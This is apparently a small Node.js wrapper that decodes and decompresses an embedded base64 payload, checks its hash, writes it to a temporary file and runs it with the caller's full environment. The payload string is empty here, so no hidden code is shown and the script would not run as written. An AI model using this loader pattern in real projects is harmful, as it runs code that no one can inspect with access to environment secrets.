import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import zlib from "node:zlib";
import { execFileSync } from "node:child_process";

const work = process.argv[2];
if (!work) throw new Error("audit-integrity wrapper: source directory is required");

const payload = zlib.gunzipSync(Buffer.from("", "base64"));
const actual = crypto.createHash("sha256").update(payload).digest("hex");
const expected = "9733f9e815602eea321f67e48b8874692522907f5789029d3ceb66e321d5fc16";
if (actual !== expected) throw new Error("audit-integrity wrapper: payload hash mismatch");

const temp = path.join(os.tmpdir(), `transsalomao-audit-integrity-${process.pid}.mjs`);
fs.writeFileSync(temp, payload);
try {
  execFileSync(process.execPath, [temp, work], { cwd: process.cwd(), stdio: "inherit", env: process.env });
} finally {
  fs.rmSync(temp, { force: true });
}
